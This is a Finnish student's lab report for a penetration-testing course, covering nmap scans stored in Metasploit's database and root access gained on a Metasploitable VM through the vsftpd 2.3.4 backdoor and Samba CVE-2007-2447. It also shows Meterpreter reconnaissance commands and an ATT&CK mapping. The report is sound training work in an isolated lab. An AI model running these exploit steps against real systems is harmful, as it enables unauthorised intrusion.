### h3 EternalHomework [tehtävänanto](https://terokarvinen.com/tunkeutumistestaus/#h3-eternalhomework)

## Tehtävissä käytetty ympäristö

### PC

- Käyttöjärjestelmä: Windows 11 Home 64-bit
- Suoritin: AMD Ryzen 7 5800X 8-Core Processor
- Muisti: 32GB RAM
- Näytönohjain: NVIDIA GeForce RTX 3080
- Virtualisointiohjelmisto: Oracle VM VirtualBox 7.0
- Internet yhteys: DNA Netti 1000 M

### Virtuaalikone

- Kali Linux [Get Kali](https://www.kali.org/get-kali/#kali-platforms)
- Base Memory: 8192 MB
- Processors: 1
- Virtual HD: 60 GB
- Video Memory: 128 MB

## x) Lue/katso/kuuntele ja tiivistä

### € Jaswal 2020: Mastering Metasploit - 4ed: Chapter 1: Approaching a Penetration Test Using Metasploit

- Termistö:
  - Exploits: Ajettava koodinpätkä, joka hyödyntää haavoittuvuutta kohteessa.
  - Payload: Koodinpätkä, joka ajetaan kohteessa onnnistuneen haavoittuvuuden hyödyntämisen jälkeen.
  - Auxiliary: Moduuleja, jotka tuovat lisää toiminnallisuuksia.
  - Encoders: Näillä pyritään hämäämään kohdekoneen suojausmekanismeja, kuten antivirusohjelmaa tai palomuuria.
  - Meterpreter: Suosittu hyötykuorma, joka tarjoaa monipuolisen valikoiman toimintoja suoritettavaksi kohdejärjestelmässä.

- Metasploit on avoimen lähdekoodin työkalu, jota kehitetään aktiivisesti.
- Käyttäjillä on mahdollisuus lisätä Metasploit:iin omia moduuleja.
- Soveltuu hyvin suurien verkkojen testaamiseen.
- Hyötykuormien vaihtelu on tehty helpoksi `set payload` -komennon avulla.

### Mitä 'nmap -sn' tekee? Älä arvaa, vaan perustele lähteillä. Mistä tiedät, että käyttämäsi lähde on luotettava?

Luotettavaksi lähteeksi voitaneen laskea Nmapin oma manuaali, aukeaa komennolla `man nmap`:

<img width="802" height="423" alt="image" src="https://github.com/user-attachments/assets/fcd8b47e-797c-4f2e-ba79-cfd6c2ff2307" />

Nmapin [dokumentaatio sivulla](https://nmap.org/book/man-host-discovery.html) on kattava selitys komennosta:

<img width="941" height="385" alt="image" src="https://github.com/user-attachments/assets/8dd03117-8779-452c-a751-936709673579" />

[Geeksforgeeks -sivustolla](https://www.geeksforgeeks.org/linux-unix/nmap-command-in-linux-with-examples/) kerrotaan aiheesta myös:

<img width="1040" height="301" alt="image" src="https://github.com/user-attachments/assets/89aab8c9-6733-485d-9420-93aca53c0c0d" />

- `nmap -sn` -komentoa kutsutaan usein ping-skannaukseksi
- Valinnalla käsketään Nmappia jättämään porttiskannaus suorittamatta isäntien tunnistamisen jälkeen.
- Käytetään kevyeen verkon tiedusteluun ja aktiivisten laitteiden määrän selvittämiseen.
- Käyttää oletuksena ICMP- ja TCP-probeja.

## b) Tallenna porttiskannauksen tuloksia Metasploitin tietokantoihin. Skannaa niin, että Metasploitable tulee mukaan. Kannattaa ottaa mukaan ainakin versioskannaus -sV (joka on banner grabbing plus).

Aloitin tehtävän tarkistamalla että koneet saavat yhteyden toisiinsa, eivätkä koneet saa yhteyttä internettiin:

<img width="752" height="634" alt="image" src="https://github.com/user-attachments/assets/2563153a-4092-46b6-83fb-396fa1b82ab8" />

Käynnistin Metasploitin tietokannan komennolla `sudo msfdb init`, jonka jälkeen avasin Metasploit Framework -konsolin `sudo msfconsole`:

<img width="705" height="162" alt="image" src="https://github.com/user-attachments/assets/6376e042-c72d-4349-982f-bc75be855fa4" />

<img width="578" height="630" alt="image" src="https://github.com/user-attachments/assets/2fc5b5fc-a2df-4038-b44d-4d6ff40cbb85" />

Tarkistin, että tietokanta on yhdistetty `db_status`:

<img width="428" height="62" alt="image" src="https://github.com/user-attachments/assets/6ee42ea8-fa26-4b4c-9030-8d05f924a51d" />

Sitten skannaus komennolla `db_nmap -sV 192.168.56.102`:

<img width="823" height="628" alt="image" src="https://github.com/user-attachments/assets/e34c9319-5830-4f58-b715-6d38e32bbc03" />

## c) Tarkastele Metasploitin tietokantoihin tallennettuja tietoja komennoilla "hosts" ja "services". Kokeile suodattaa näitä listoja tai hakea niistä.

`services` ja `hosts` palauttivat tiedot tietokannasta:

<img width="817" height="728" alt="image" src="https://github.com/user-attachments/assets/0fe96535-1794-4236-bfa3-ffa93adf1c98" />

- `hosts` palauttaa listan laitteista jotka ovat löytyneet skannauksessa.
- `services` palauttaa listan skannauksessa löytyneistä avoimista porteista ja palveluista jotka käyttävät kyseisiä portteja.

Tietokannasta haku onnistuu --search parametrilla, esimerkiksi `services --search telnet`:

<img width="648" height="155" alt="image" src="https://github.com/user-attachments/assets/1653d684-4de9-48e8-b8e7-177525c9c50a" />

Suodattaa voi esimerkiksi protokollan mukaan `services --protocol tcp`:

<img width="843" height="547" alt="image" src="https://github.com/user-attachments/assets/438c42db-de9c-48c8-b482-608ef2d1180e" />

## d) Internet famous. Etsi Metasploitablen mukana tulevista hyökkäyksistä (en: exploits; search) sellainen, joka on ollut julkisuudessa.

[Aiemmassa raportissani](https://github.com/arilep/Tunkeutumistestaus/blob/main/h2%20-%20DORA%20the%20Explora.md) tuli vastaan tunnettu [vsftpd 2.3.4](https://medium.com/@ucheomaokoma_/exploiting-vsftpd-2-3-4-a-hands-on-penetration-test-on-a-backdoored-ftp-service-c869b2ffd43d) -haavoittuvuus.

Lähdin tutkimaan josko tuo kyseinen exploit löytyisi Metasploitablesta:

<img width="966" height="363" alt="image" src="https://github.com/user-attachments/assets/7e9cdc2d-9e3d-4c83-9916-1c46bcb0c1e2" />

Kyseessä on vsftpd:n versiossa oleva takaovi. Jos käyttäjänimi päättyy hymiöön `:)` palvelin avaa shellin porttiin 6200.

## e) Vertaile nmap:n omaa tiedostoon tallennusta (-oA foo) ja db_nmap:n tallennusta tietokantoihin. Mitkä ovat eri tiedostomuotojen ja Metasploitin tietokannan hyvät puolet?

Ajoin komennon `nmap -sV 192.168.56.102 -oA testi_skanni` joka tallensi kolme erillistä tiedostoa testi_skanni.nmap, testi_skanni.gnmap ja testi_skanni.xml:

<img width="493" height="49" alt="image" src="https://github.com/user-attachments/assets/3e6be199-0795-4abc-8861-0a33aaa0f8d7" />

- nmap tallennus
  - Tallentaa kolme erillistä tiedostoa eri käyttötarkoituksia varten.
  - Kevyt, nopea ja helppokäyttöinen.
  - Voidaan käyttää ilman tietokantaa ja tiedostoja voidaan siirtää tai arkistoida tarpeen mukaan.

- db_nmap tallennus
  - Integroitu Metasploitin kanssa, skannausten tulokset suoraan Metasploit moduulien käytössä.
  - Haku- ja suodatustoiminnot.
  - Tuloksia ei tarvitse erikseen tallentaa.

## f) Murtaudu Metasploitablen vsftpd-palveluun

Noniin, päästiinkin palaamaan d) -kohdassa nostettuun aiheeseen.

Työvaiheet tässä osiossa olivat nopeita ja pelottavankin helppoja:

- Haetaan soveltuva moduuli
- Otetaan moduuli käyttöön
- Annetaan maali ja reverse payload
- Hyödynnetään haavoittuvuutta

<img width="973" height="456" alt="image" src="https://github.com/user-attachments/assets/48bfe5fc-61e7-40da-b9ff-3b999cbdfed6" />

## g) Kerää levittäytymisessä (lateral movement) tarvittavaa tietoa metasploitablesta. Analysoi tiedot. Selitä, miten niitä voisi hyödyntää.

`?` sain Help menu -näkymän, josta lähdin tutkimaan eri vaihtoehtoja.

### ps

`ps` Listaa käynnissä olevat prosessit kohteessa:

<img width="522" height="323" alt="image" src="https://github.com/user-attachments/assets/8fc72cfa-b10e-4770-94d7-27e4c8e2123a" />

- Näillä tiedoilla saadaan parempi käsitys hyökkäyspinta-alasta jota hyödyntää.
- Voidaan saada selville myös tietoja eri palveluista, joissa on mahdollisesti lisää haavoittuvuuksia. Tämä mahdollistaa hyökkäyksen jalostamisen pidemmälle.

### getuid

`getuid` Näyttää millä käyttäjällä ollaan kohteessa:

<img width="225" height="66" alt="image" src="https://github.com/user-attachments/assets/199da62f-e1a2-4b1e-8376-9b5e9dcda3f4" />

- Saadaan tietoon millä oikeuksilla ollaan kirjautuneena ja sitä kautta mihin tiedostoihin tai hakemistoihin päästään käsiksi.

### sysinfo

`sysinfo` Palauttaa tietoja kohdejärjestelmästä:

<img width="459" height="118" alt="image" src="https://github.com/user-attachments/assets/153b2ec8-a152-45f8-9243-3d042d9d8803" />

- Tiedot voivat olla hyökkääjälle hyödyllisiä, kun tiedetään esimerkiksi kohteen käyttöjärjestelmä ja voidaan lähteä etsimään kyseiseen käyttöjärjestelmään liittyviä haavoittuvuuksia.
- Erityisesti vanhat ja päivittämättömät järjestelmät otollinen kohde.

### route

`route` Näyttää kohteen reititystaulun:

<img width="537" height="193" alt="image" src="https://github.com/user-attachments/assets/34d0e418-ea8c-4db1-8b11-d4e2caa181ef" />

- Saadaan erittäin hyödyllistä tietoa verkon rakenteesta.
- Näillä tiedoilla mahdollistetaan eteneminen verkossa laitteesta toiseen.

## h) Murtaudu Metasploitableen jollain toisella tavalla. (Jos tämä kohta on vaikea, voit tarvittaessa turvautua verkosta löytyviin läpikävelyohjeisiin. Merkitse silloin raporttiin, missä määrin tarvitsit niitä).

Muistui mieleen [aiemmassa raportissa](https://github.com/arilep/Tunkeutumistestaus/blob/main/h2%20-%20DORA%20the%20Explora.md) tutkailemani Samba haavoittuvuus CVE-2007-2447. Päätin lähteä kokeilemaan murtautumista sen parissa.

Ensin haku `search CVE-2007-2447`:

<img width="1016" height="195" alt="image" src="https://github.com/user-attachments/assets/86e63ebf-4810-4f0e-a5ca-744e2c5143f7" />

Vastaavuus löytyi. Otetaan käyttöön `use 0`:

<img width="590" height="40" alt="image" src="https://github.com/user-attachments/assets/ad12dc7e-93e9-4e6d-a532-a638cb944228" />

Annetaan RHOSTS ja LHOST:

<img width="606" height="115" alt="image" src="https://github.com/user-attachments/assets/03855b30-1c83-4215-91ab-1c4cdaab91ff" />

Ja sitten `exploit`:

<img width="924" height="70" alt="image" src="https://github.com/user-attachments/assets/9719b906-333f-4f17-8766-5d744a9a2a4e" />

Ja sisällä ollaan root-oikeuksilla:

<img width="651" height="626" alt="image" src="https://github.com/user-attachments/assets/4e63d329-5604-4386-ac1d-eb52e8c49fdf" />

## i) Demonstroi Meterpretrin ominaisuuksia.

Näitä tulikin listattua jo tuossa g) osiossa, esimerkiksi `getuid` `sysinfo` ja `route`:

<img width="508" height="311" alt="image" src="https://github.com/user-attachments/assets/420199af-49a0-45c5-a3ae-c4ddf1d8abd9" />

Tutkiskelin vielä help menua ja törmäsin `shell` -komentoon, testasin sitä:

<img width="287" height="600" alt="image" src="https://github.com/user-attachments/assets/394e4002-599f-4661-846b-3c3203215f00" />

Muita hyökkääjälle mielenkiintoisia komentoja voisivat olla esimerkiksi `arp` ja `ifconfig`:

<img width="413" height="590" alt="image" src="https://github.com/user-attachments/assets/1e3d08af-de85-42aa-8e4f-7772091807d3" />

## j) Tallenna shell-sessio tekstitiedostoon script-työkalulla (script -fa log001.txt) tai tmux:lla.

Aloitin tallennuksen komennolla `script -fa log001.txt`

Tämän jälkeen käynnistin Metasploit Frameworkin `sudo msfconsole`

Lähdin toistamaan d) osion vaiheita:

- `search vsftpd` listataan moduulit
- `use 1` valitaan exploit
- `set RHOSTS 192.168.56.102` asetetaan kohde
- `set LHOST 192.168.56.101` asetetaan reverse payload
- `exploit` hyödynnetään haavoittuvuutta ja isketään koneeseen kiinni
- ajoin muutamia komentoja meterpreterissä: `getuid`, `sysinfo`, `arp`
- Lopuksi `exit` kolme kertaa, poistuttiin meterpreter sessiosta, poistuttiin metasploitablesta ja lopetettiin shell-session tallennus.

Lopuksi tarkistin että log001.txt on luotu ja sieltä löytyy kaivattua sisältöä:

<img width="927" height="365" alt="image" src="https://github.com/user-attachments/assets/d9078a7e-443f-4a36-a5be-a11fd1ea30fd" />

<img width="684" height="216" alt="image" src="https://github.com/user-attachments/assets/a6c1319c-cb7e-4868-8af8-1426c1137988" />

## k) Pivot point. Laita kaikki harjoituksen tiedostot (script -fa, nmap -oA...) samaan kansioon. Hae sopiva pivot point (sovellus, versio, osoite, MAC-numero) 'grep -r' -komennolla. Keksi uskottava esimerkkikysymys, johon haet vastausta.

Loin uuden kansion "foo" ja siirsin tiedostot sinne:

<img width="706" height="480" alt="image" src="https://github.com/user-attachments/assets/a678109e-e652-4814-8070-f6f8885ee50a" />

Pivot pointiksi valitsin Metasploitable2-koneen IP-osoitteen, eli `grep -R 192.168.56.102`:

<img width="953" height="461" alt="image" src="https://github.com/user-attachments/assets/b2b07d28-b601-4e43-b371-dd3315f134c2" />

Kysymys: Onko kohteeseen 192.168.56.102 onnistuttu murtautumaan? Jos on, niin millä keinoin / työkaluilla?

## l) Attaaack! Mitä Mitre Attack taktiikoita ja tekniikoita käytit tässä harjoituksessa? (Tässä alakohdassa "Attaack!" ei tarvitse tehdä lisää testejä koneella, koska testit on jo tehty.)

- Reconnaissance
  - Nmap -skannaus
- Initial Access
  - vsftpd 2.3.4 exploit
  - Samba CVE 2007-2447 exploit
- Discovery
  - sysinfo
  - getuid
  - arp
  - ps
- Command and Control
  - Meterpreter shell

## Lähteet

Geeksforgeeks.org. Nmap Command in Linux with Examples. https://www.geeksforgeeks.org/linux-unix/nmap-command-in-linux-with-examples/

Jaswal, N. 2020. Mastering Metasploit - Fourth Edition. 

Kali.org. kali-platforms. https://www.kali.org/get-kali/#kali-platforms

Karvinen, T. 22.3.2026. Tunkeutumistestaus. https://terokarvinen.com/tunkeutumistestaus/

MITRE ATT&CK. Enterprise tactics. https://attack.mitre.org/tactics/enterprise/

Nmap.org. Host Discovery. https://nmap.org/book/man-host-discovery.html

Okoma, U. 13.5.2025. Exploiting vsftpd 2.3.4: A Hands-On Penetration Test on a Backdoored FTP Service. https://medium.com/@ucheomaokoma_/exploiting-vsftpd-2-3-4-a-hands-on-penetration-test-on-a-backdoored-ftp-service-c869b2ffd43d
